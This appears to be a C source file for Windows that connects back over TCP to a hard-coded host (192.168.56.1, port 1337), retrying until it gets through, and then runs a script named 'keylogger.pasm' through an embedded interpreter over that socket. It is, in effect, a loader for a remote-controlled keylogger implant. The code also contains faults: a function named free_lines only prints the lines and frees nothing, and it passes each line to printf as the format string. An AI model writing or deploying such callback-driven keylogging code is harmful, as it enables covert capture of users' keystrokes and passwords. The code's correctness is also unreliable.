#include "../include/pasm.h"
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <wininet.h>
#include <winsock.h>

#pragma comment(lib, "ws2_32.lib")

#define BUFFER_SIZE 4096


#define INITIAL_BUFFER_SIZE 256
#define INITIAL_ARRAY_SIZE 10

char** read_file_into_array(const char* filename, int* lines_count) {
    FILE* file = fopen(filename, "r");
    if (file == NULL) {
        perror("Error opening file");
        return NULL;
    }

    // Allocate initial space for the array of strings
    int array_size = INITIAL_ARRAY_SIZE;
    char** lines = malloc(array_size * sizeof(char*));
    if (lines == NULL) {
        perror("Error allocating memory for lines");
        fclose(file);
        return NULL;
    }

    char buffer[INITIAL_BUFFER_SIZE];
    int count = 0;

    while (fgets(buffer, INITIAL_BUFFER_SIZE, file)) {
        // Remove newline character, if present
        buffer[strcspn(buffer, "\n")] = '\0';

        // Reallocate if necessary
        if (count >= array_size) {
            array_size *= 2;
            char** temp = realloc(lines, array_size * sizeof(char*));
            if (temp == NULL) {
                perror("Error reallocating memory for lines");
                // Free previously allocated memory
                for (int i = 0; i < count; i++) {
                    free(lines[i]);
                }
                free(lines);
                fclose(file);
                return NULL;
            }
            lines = temp;
        }

        // Allocate memory for the line and store it
        lines[count] = malloc(strlen(buffer) + 1);
        if (lines[count] == NULL) {
            perror("Error allocating memory for a line");
            // Free previously allocated memory
            for (int i = 0; i < count; i++) {
                free(lines[i]);
            }
            free(lines);
            fclose(file);
            return NULL;
        }

        strcpy(lines[count], buffer);
        count++;
    }

    fclose(file);

    // Store the number of lines read
    *lines_count = count;

    return lines;
}

void free_lines(char** lines, int count) {
    for (int i = 0; i < count; i++) {
        printf(lines[i]);
    }
}

int main(int argc, char** argv) {
    int sock;
    int first = 1;
    struct sockaddr_in server;
    char* server_reply = (char*)malloc(BUFFER_SIZE);
    if (server_reply == NULL) {
        return -1;
    }

    server.sin_family = AF_INET;
    WORD wVersionRequested = MAKEWORD(2, 2);
    WSADATA wsaData;
    WSAStartup(wVersionRequested, &wsaData);

retry:
    if (!first) {
        closesocket(sock);
    }
    else {
        first = 0;
    }

    server.sin_addr.s_addr = inet_addr("192.168.56.1");
    server.sin_port = htons(1337);

    //Create socket
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == -1) {
        Sleep(500);
        goto retry;
    }

    //Connect to remote server
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0)
    {
        //connect failed
        Sleep(500);
        goto retry;
    }

    const char* filename = "../../examples/keylogger.pasm";
    int lines_count;
    char** lines = read_file_into_array(filename, &lines_count);

    return pasm_run_script(NULL, lines, lines_count, sock);
}
